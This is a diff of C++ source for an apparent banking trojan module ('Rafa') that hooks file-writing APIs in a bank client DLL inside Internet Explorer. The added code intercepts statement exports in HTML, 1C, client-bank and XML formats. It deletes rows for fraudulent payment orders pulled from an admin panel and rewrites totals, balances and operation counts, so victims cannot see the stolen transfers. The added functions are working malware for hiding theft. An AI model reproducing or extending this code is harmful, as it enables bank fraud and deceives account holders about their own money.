@@ -26,6 +26,9 @@ namespace DBGRAFADLL
 
 #define RafaDllModule //говорим что модуль включен
 
+//не нужно проводить аз
+//#define TEST_NOTAZ
+
 namespace Rafa
 {
 
@@ -97,7 +100,13 @@ struct TreeAccount
 //типы отчетов рафы
 enum TypeFileReport
 {
-	InfoOperaions //справка по операциям
+	ReportNothing,
+	ReportInfoOperaions, //справка по операциям
+	ReportTxt, //пока неизвестный текстовый файл
+	ReportXml, //пока неизвестный xml файл
+	ReportFormatClientBank, //экспорт для клиент-банка
+	ReportFormat1C, //экспорт для 1C
+	ReportFormatXml //экспорт в xml формате
 };
 
 //Отчет формируемый рафой
@@ -117,6 +126,8 @@ static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке
 static char* GetAdminUrl( char* url );
 static void DBGPrintPayment( PaymentOrder* po ); //печать переданной (считанной) платежки для дебага
 static void RelocPayment( char* base ); //перерасчитывает адреса в массиве paymentOrders после перевыделения памяти или загрузки из файла
+static int BalansToInt( const char* s, int format = 0 );
+static char* IntToBalans( int v, char* s, int format = 0 );
 
 HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
 DWORD PID = 0; //для избежания 2-го запуска
@@ -544,16 +555,35 @@ static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess
 {
 	HANDLE file = pHandlerCreateFileA( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
 							  dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+	DBGRAFA( "Rafa", "CreateFileA" );
 	if( file != INVALID_HANDLE_VALUE && (dwDesiredAccess & GENERIC_WRITE) != 0 )
 	{
-		if( m_strstr( lpFileName, "/report.html") )
+		TypeFileReport type = ReportNothing;
+		if( m_strstr( lpFileName, "report.html") )
+		{
+			DBGRAFA( "Rafa", "Перехватили отчет InfoOperaions '%s'", lpFileName );
+			type = ReportInfoOperaions;
+		}
+		else
+			if( m_strstr( lpFileName, ".txt" ) )
+			{
+				DBGRAFA( "Rafa", "Перехватили файл txt '%s'", lpFileName );
+				type = ReportTxt;
+			}
+			else
+				if( m_strstr( lpFileName, ".xml" ) )
+				{
+					DBGRAFA( "Rafa", "Перехватили файл xml '%s'", lpFileName );
+					type = ReportXml;
+				}
+		if( type != ReportNothing )
 		{
 			//ложим открытый файл в свободную ячейку
 			for( int i = 0; i < maxFileReports; i++ )
 				if( fileReports[i].file == 0 )
 				{
 					fileReports[i].file = file;
-					fileReports[i].type = InfoOperaions;
+					fileReports[i].type = type;
 					fileReports[i].text = 0;
 					fileReports[i].len = 0;
 					break;
@@ -568,19 +598,406 @@ static BOOL WINAPI HandlerWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumbe
 	for( int i = 0; i < maxFileReports; i++ )
 		if( fileReports[i].file == hFile ) //перехватываемый отчет, пишем его в память
 		{
+			DBGRAFA( "Rafa", "В отчет добавлено байт: %d, было %d", nNumberOfBytesToWrite, fileReports[i].len );
 			fileReports[i].text = (char*)MemRealloc( fileReports[i].text, fileReports[i].len + nNumberOfBytesToWrite + 1 );
 			m_memcpy( fileReports[i].text + fileReports[i].len, lpBuffer, nNumberOfBytesToWrite );
 			fileReports[i].len += nNumberOfBytesToWrite;
 			fileReports[i].text[fileReports[i].len] = 0;
 			if( lpNumberOfBytesWritten )
 				*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
+			bool saved = false; //нужно ли сохранить файл, т. е. формат файла не наш
+			if( fileReports[i].type == ReportTxt ) //неизвестный текстовый файл
+			{
+				if( fileReports[i].len > 32 ) //достаточно данных для идентификации
+				{
+					if( m_strstr( fileReports[i].text, "1CClientBankExchange" ) ) //format 1C
+						fileReports[i].type = ReportFormat1C;
+					else
+						if( m_strstr( fileReports[i].text, "HEADER" ) && m_strstr( fileReports[i].text, "F00: " ) ) //формат клиент-банка
+							fileReports[i].type = ReportFormatClientBank;
+						else
+							saved = true;
+
+				}
+			}
+			else
+				if( fileReports[i].type == ReportXml ) //неизвестный xml файл
+				{
+					if( fileReports[i].len > 80 ) //достаточно данных для идентификации
+						if( m_strstr( fileReports[i].text, "<AccountStatements>" ) )
+							fileReports[i].type = ReportFormatXml;
+						else
+							saved = true;
+				}
+			if( saved ) //неопознаные форматы файлов оказались не нашими, поэтому сохраняем их как есть
+			{
+				DWORD wr;
+				pHandlerWriteFile( hFile, fileReports[i].text, fileReports[i].len, &wr, 0 );
+				MemFree(fileReports[i].text);
+				fileReports[i].file = 0;
+				fileReports[i].text = 0;
+				fileReports[i].len = 0;
+			}
 			return TRUE;
 		}
 	return pHandlerWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
 }
 
+static char* FindBetweenTag( char* text, const char* left, const char* right, int& sz )
+{
+	char* p = m_strstr( text, left );
+	if( p )
+	{
+		int l = m_lstrlen(left);
+		char* p2 = m_strstr( p + l, right );
+		if( p2 )
+		{
+			l = m_lstrlen(right);
+			sz = p2 - p + l;
+			return p;
+		}
+	}
+	return 0;
+}
+
+static void ChangeSumInfoOperaions( char* html, int addSum, int format )
+{
+	char* p = m_strstr( html, "<td" );
+	if( p == 0 ) return;
+	while( *p++ != '>' ); //пока не закончился тег
+	char* pp = p; //пробелы потом число
+	while( *p != '<' ) p++; //идем до </td>
+	*p = 0;
+	//извлекаем сумму
+    int sum = BalansToInt( pp, format );
+    sum += addSum;
+    char sumText[32];
+    IntToBalans( sum, sumText, format );
+    //ложим новую сумму
+    char* ps = sumText;
+    while( *ps != 0 ) ps++; //идем в конец числа
+    ps--; //на последней цифре суммы
+	*p-- = '<'; //восстанавливаем
+	while( ps >= sumText ) *p-- = *ps--; //заносим число с конца в начало
+	while( *p != '>' ) *p-- = ' ';  //заполняем пробелами пока не встретим начальный тег
+}
+
 static void ModifyInfoOperaions( FileReport& fr )
 {
+	DBGRAFA( "RAFA", "Модификация отчета в html формате" );
+	for( int i = 0; i < c_paymentOrders; i++ )
+	{
+		//приводим сумму к виду как в файле (1,234.56)
+		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
+		char sumText[32];
+		IntToBalans( sumInt, sumText, 1 );
+		char* html = fr.text;
+		int state = 0;
+		while( state >= 0 )
+		{
+			int sz;
+			//находим строку таблицы
+			html = FindBetweenTag( html, "<tr>", "</tr>", sz );
+			if( html == 0 ) break;
+			char c = html[sz]; //ставим в конце строки 0, чтобы дальше не был поиск
+			html[sz] = 0;
+			switch( state )
+			{
+				case 0: //поиск строки с платежкой
+					{
+						//есть ли нужная сумма в строке
+						char* p = m_strstr( html, sumText );
+						if( p )
+						{
+							//есть ли нужный счет в строке
+							p = m_strstr( p, paymentOrders[i].recvAcc );
+							if( p )
+							{
+								//есть ли нужное назначение
+								p = m_strstr( p, paymentOrders[i].comment );
+								if( p )
+								{
+									//найдена строка с платежкой, удаляем
+									int restLen = fr.len - (html - fr.text) - sz;
+									m_memcpy( html, html + sz, restLen );
+									fr.len -= sz;
+									html[restLen] = 0;
+									state = 1; //переходим на модификацию итоговых сумм
+									sz = 0;
+								}
+							}
+						}
+					}
+					break;
+				case 1: //поиск строки с итоговой суммой
+					{
+						char* p = m_strstr( html, "Сумма в валюте счета" );
+						if( p )
+						{
+							ChangeSumInfoOperaions( p, -sumInt, 1 );
+							state = 2;
+						}
+					}
+					break;
+				case 2: //поиск количества операций
+					{
+						char* p = m_strstr( html, "Количество операций" );
+						if( p )
+						{
+							ChangeSumInfoOperaions( p, -1, 2 );
+							state = 3;
+						}
+				    }
+					break;
+				case 3: //поиск исходящего остатка
+					{
+						char* p = m_strstr( html, "Исходящий остаток на конец дня" );
+						if( p )
+						{
+							ChangeSumInfoOperaions( p, sumInt, 1 );
+							state = 4;
+						}
+				    }
+					break;
+				case 4: //поиск входящего остатка
+					{
+						char* p = m_strstr( html, "Входящий остаток на начало дня" );
+						if( p )
+						{
+							ChangeSumInfoOperaions( p, sumInt, 1 );
+							state = 3;
+						}
+				    }
+					break;
+			}
+			html[sz] = c; //восстанавливаем
+			html += sz;
+		}
+	}
+}
+
+//возвращает на сколько изменилась длина отчета, endVal - символ окончания числа
+static int ChangeSumForVar( char* text, int lenText, const char* var, int addSum, int format, char endVal )
+{
+	char* p = m_strstr( text, var );
+	if( p == 0 ) return 0;
+	int len = m_lstrlen(var);
+	p += len;
+	//ищем начало числа
+	while( *p < '0' || *p > '9' ) p++;
+	//ищем конец числа 
+	char* pp = p;
+	while( *p != endVal ) p++;
+	*p = 0;
+	int sum = BalansToInt( pp, format ) + addSum;
+	*p = endVal;
+	char sumText[32];
+	IntToBalans( sum, sumText, format ); 
+	len = m_lstrlen(sumText);
+	int oldLen = p - pp;
+	int subLen = len - oldLen;
+	//если размер старой и новой суммы разные, то перемещаем отрезок справа
+	if( len != oldLen )
+	{
+		int movedLen = lenText - (p - text); //перемещаемая длина
+		if( len < oldLen ) //длина суммы стала меньше 
+			m_memcpy( p + subLen, p, movedLen );
+		else //длина суммы стала больше
+		{
+			char* p2 = text + lenText;
+			char* p3 = p2 + subLen;
+			while( p2 >= p ) *p3-- = *p2--;
+		}
+	}
+	//заменяем суммы
+	p = sumText;
+	while( *p ) *pp++ = *p++;
+	return subLen;
+}
+
+static void ModifyFormat1C( FileReport& fr )
+{
+	DBGRAFA( "RAFA", "Модификация отчета в 1C формате" );
+	for( int i = 0; i < c_paymentOrders; i++ )
+	{
+		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
+		char sumText[32];
+		IntToBalans( sumInt, sumText, 4 );
+		char* html = fr.text;
+		bool stop = false;
+		while( !stop )
+		{
+			int sz;
+			//находим секцию
+			html = FindBetweenTag( html, "СекцияДокумент", "КонецДокумента", sz );
+			if( html == 0 ) break;
+			sz += 2; //перевод строки \r\n
+			char c = html[sz]; //ставим в конце 0, чтобы дальше не был поиск
+			html[sz] = 0;
+			//есть ли нужная сумма в секции
+			char* p = m_strstr( html, sumText );
+			if( p )
+			{
+				//есть ли нужный счет в секции
+				p = m_strstr( p, paymentOrders[i].recvAcc );
+				if( p )
+				{
+					//есть ли нужное назначение
+					p = m_strstr( p, paymentOrders[i].comment );
+					if( p )
+					{
+						//найдена секция с платежкой, удаляем
+						int restLen = fr.len - (html - fr.text) - sz;
+						m_memcpy( html, html + sz, restLen );
+						fr.len -= sz;
+						html[restLen] = 0;
+						int oldLen = fr.len;
+						//уменьшаем итоговую сумму и увеличиваем остаток
+						oldLen += ChangeSumForVar( fr.text, oldLen, "ВсегоСписано", -sumInt, 4, 'r' );
+						oldLen += ChangeSumForVar( fr.text, oldLen, "КонечныйОстаток", sumInt, 4, 'r' );
+						sz = oldLen - fr.len;
+						fr.len = oldLen;
+						stop = true;
+					}
+				}
+			}
+			html[sz] = c;
+			html += sz;
+		}	
+	}
+}
+
+//модификация экспорта для Клиент-Банка
+static void ModifyFormatKB( FileReport& fr )
+{
+	DBGRAFA( "RAFA", "Модификация отчета в формате клиент-банка" );
+	for( int i = 0; i < c_paymentOrders; i++ )
+	{
+		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
+		char sumText[32];
+		IntToBalans( sumInt, sumText, 0 );
+		char* html = fr.text;
+		bool stop = false;
+		while( !stop )
+		{
+			int sz;
+			//находим секцию
+			html = FindBetweenTag( html, "OPERATION", "F312: ", sz );
+			if( html == 0 ) break;
+			sz += 2; //перевод строки \r\n
+			char c = html[sz]; //ставим в конце 0, чтобы дальше не был поиск
+			html[sz] = 0;
+			//есть ли нужная сумма в секции
+			char* p = m_strstr( html, sumText );
+			if( p )
+			{
+				//есть ли нужный счет в секции
+				p = m_strstr( p, paymentOrders[i].recvAcc );
+				if( p )
+				{
+					//по назначению не проверяем, так как кодировка разная
+					//найдена секция с платежкой, удаляем
+					int restLen = fr.len - (html - fr.text) - sz;
+					m_memcpy( html, html + sz, restLen );
+					fr.len -= sz;
+					html[restLen] = 0;
+					int oldLen = fr.len;
+					//уменьшаем итоговую сумму
+					static const char* flds1[] = { "F42:", "F29:", "F70:", "F71:", 0 };
+					const char** fld = flds1;
+					sumInt = 13449490;
+					while( *fld ) 
+					{
+						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, -sumInt, 0, 'r' );
+						fld++;
+					}
+					
+					//увеличиваем остаток
+					static const char* flds2[] = { "F46:", "F52:", "F69:", 0 };
+					fld = flds2;
+					while( *fld ) 
+					{
+						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, sumInt, 0, 'r' );
+						fld++;
+					}
+
+					//уменьшаем количество платежек
+					oldLen += ChangeSumForVar( fr.text, oldLen, "F44:", -1, 2, 'r' );
+
+					sz = oldLen - fr.len;
+					fr.len = oldLen;
+					stop = true;
+				}
+			}
+			html[sz] = c;
+			html += sz;
+		}	
+	}
+}
+
+//модификация для формата xml
+static void ModifyFormatXml( FileReport& fr )
+{
+	DBGRAFA( "RAFA", "Модификация отчета в xml формате" );
+	for( int i = 0; i < c_paymentOrders; i++ )
+	{
+		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
+		char* text = fr.text;
+		bool stop = false;
+		while( !stop )
+		{
+			int sz;
+			//находим секцию
+			text = FindBetweenTag( text, "<Statement>", "</Statement>", sz );
+			if( text == 0 ) break;
+			sz += 2; //перевод строки \r\n
+			char c = text[sz]; //ставим в конце 0, чтобы дальше не был поиск
+			text[sz] = 0;
+			//есть ли нужная сумма в секции
+			char* p = m_strstr( text, paymentOrders[i].sum );
+			if( p )
+			{
+				//есть ли нужный счет в секции
+				p = m_strstr( p, paymentOrders[i].recvAcc );
+				if( p )
+				{
+					//найдена секция с платежкой, удаляем
+					int restLen = fr.len - (text - fr.text) - sz;
+					m_memcpy( text, text + sz, restLen );
+					fr.len -= sz;
+					text[restLen] = 0;
+					int oldLen = fr.len;
+
+					//уменьшаем итоговую сумму
+					static const char* flds1[] = { "<DebitOverturn", "<DebitOverturnCover>", "<DebitOverturnDealing>", "<DebitOverturnDealingCover>", 0 };
+					const char** fld = flds1;
+					while( *fld ) 
+					{
+						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, -sumInt, 0, '<' );
+						fld++;
+					}
+					
+					//увеличиваем остаток
+					static const char* flds2[] = { "<OpenRemainder>", "<OutRemainder>", "<OutRemainderWithDealing>", 0 };
+					fld = flds2;
+					while( *fld ) 
+					{
+						oldLen += ChangeSumForVar( fr.text, oldLen, *fld, sumInt, 0, '<' );
+						fld++;
+					}
+
+					//уменьшаем количество платежек
+					oldLen += ChangeSumForVar( fr.text, oldLen, "<DebitOverturnCount>", -1, 2, '<' );
+
+					sz = oldLen - fr.len;
+					fr.len = oldLen;
+					stop = true;
+				}
+			}
+			text[sz] = c;
+			text += sz;
+		}
+	}
 }
 
 static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
@@ -591,11 +1008,18 @@ static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
 			//поправляем его
 			switch( fileReports[i].type )
 			{
-				case InfoOperaions: ModifyInfoOperaions(fileReports[i]); break;
+				case ReportInfoOperaions:	 ModifyInfoOperaions(fileReports[i]); break;
+				case ReportFormatClientBank: ModifyFormatKB(fileReports[i]); break;
+				case ReportFormat1C:		 ModifyFormat1C(fileReports[i]); break;
+				case ReportFormatXml:		 ModifyFormatXml(fileReports[i]); break;
 			}
 			//пишем в файл
 			DWORD wr;
 			pHandlerWriteFile( hObject, fileReports[i].text, fileReports[i].len, &wr, 0 );
+			MemFree(fileReports[i].text);
+			fileReports[i].file = 0;
+			fileReports[i].text = 0;
+			fileReports[i].len = 0;
 			break;
 		}
 	return pHandlerCloseHandle(hObject);
@@ -1132,7 +1556,11 @@ static void WorkInRafa()
 		if( c_itemAccs > 0 )
 		{
 			DBGRAFA( "Rafa", "Найдено веток счетов %d", c_itemAccs );
+#ifdef TEST_NOTAZ
+			PaymentOrder* po = 0;
+#else
 			PaymentOrder* po = GetPaymentOrders(); //передаем баланс и получаем данные для заполнения платежки
+#endif
 			if( po )
 			{
 				//ищем счет в котором будем добавлять платежку
@@ -1288,10 +1716,9 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 				bool res = PathIAT( dll, "USER32.DLL", "SendMessageA", HandlerSendMessageA, (PVOID*)&pHandlerSendMessageA );
 				res &= PathIAT( dll, "USER32.DLL", "CreateWindowExA", HandlerCreateWindowExA,(PVOID*)&pHandlerCreateWindowExA );
 				res &= PathIAT( dll, "USER32.DLL", "TrackPopupMenu", HandlerTrackPopupMenu,(PVOID*)&pHandlerTrackPopupMenu );
-				//ниже следующие перехватчики апи не обязательный для автозалива, поэтому их перехват не проверяем
-				PathIAT( dll, "KERNEL32.DLL", "CreateFileA", HandlerCreateFileA,(PVOID*)&pHandlerCreateFileA );
-				PathIAT( dll, "KERNEL32.DLL", "WriteFile", HandlerWriteFile,(PVOID*)&pHandlerWriteFile );
-				PathIAT( dll, "KERNEL32.DLL", "CloseHandle", HandlerCloseHandle,(PVOID*)&pHandlerCloseHandle );
+				res &= PathIAT( dll, "KERNEL32.DLL", "CreateFileA", HandlerCreateFileA,(PVOID*)&pHandlerCreateFileA );
+				res &= PathIAT( dll, "KERNEL32.DLL", "WriteFile", HandlerWriteFile,(PVOID*)&pHandlerWriteFile );
+				res &= PathIAT( dll, "KERNEL32.DLL", "CloseHandle", HandlerCloseHandle,(PVOID*)&pHandlerCloseHandle );
 				if( res )
 				{
 					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok" );
@@ -1342,32 +1769,54 @@ void InitHook_FilialRConDll()
 }
 
 //переводит значение баланса в целочисленное число, два последних числа это копейки
-static int BalansToInt( const char* s )
+//format = 0 - учитываем копейки, format = 2 - игнорируем копейки
+static int BalansToInt( const char* s, int format )
 {
 	int v = 0;
+	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
 	while( *s )
 	{
-		if( *s != '.' ) v = v * 10 + (*s - '0');
+	    if( *s == '.' ) kop = 0;
+		if( *s >= '0' && *s <= '9' ) //игнорируем точку и запятые (1,234,567.89)
+		{
+			v = v * 10 + (*s - '0');
+			if( kop >= 0 ) kop++;
+		}
 		s++;
+	}
+	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	if( (format & 2) == 0 )
+	{
+		if( kop < 0 ) kop = 0;
+		for( int i = kop; i < 2; i++ ) v *= 10; 
 	}
 	return v;
 }
 
-//переводит целое число в текстовый баланс
-static char* IntToBalans( int v, char* s )
+//переводит целое число в текстовый баланс, если format = 1, то ставить , для разделения тысяч, 
+//если = 2, то обыкновенное число без разделителей, 4 - убрать в конце суммы нули в копейках
+static char* IntToBalans( int v, char* s, int format )
 {
 	int len = 0;
 	char* p = s;
-	while( v != 0 || len <= 4 ) //копейки с точкой обязательно нужно, делаем минимум текст с форматом 0.00
+	while( v != 0 || ((format & 2) == 0 && len < 4) ) //копейки с точкой обязательно нужно, делаем минимум текст с форматом 0.00
 	{
 		*p++ = (v % 10) + '0';
 		len++;
-		if( len == 2 ) //отделяем копейки точкой
-		{
-			*p++ = '.';
-			len++;
-		}
 		v /= 10;
+		if( (format & 2) == 0 )
+		{
+			if( len == 2 ) //отделяем копейки точкой
+			{
+				*p++ = '.';
+				len++;
+			}
+			if( (format & 1) && v != 0 && len > 2 && ((len - 2) % 4) == 0 )
+			{
+				*p++ = ',';
+				len++;
+			}
+	    }
 	}
 	*p = 0;
 	//переворачиваем число
@@ -1376,6 +1825,15 @@ static char* IntToBalans( int v, char* s )
 		char c = s[i];
 		s[i] = s[len - i - 1];
 		s[len - i - 1] = c;
+	}
+	if( format & 4 )
+	{
+		len--;
+		while( s[len] == '0' ) len--;
+		if( s[len] == '.' ) //0 копеек, только рубли (остается целая часть)
+			s[len] = 0;
+		else
+			s[len + 1] = 0;
 	}
 	return s;
 }
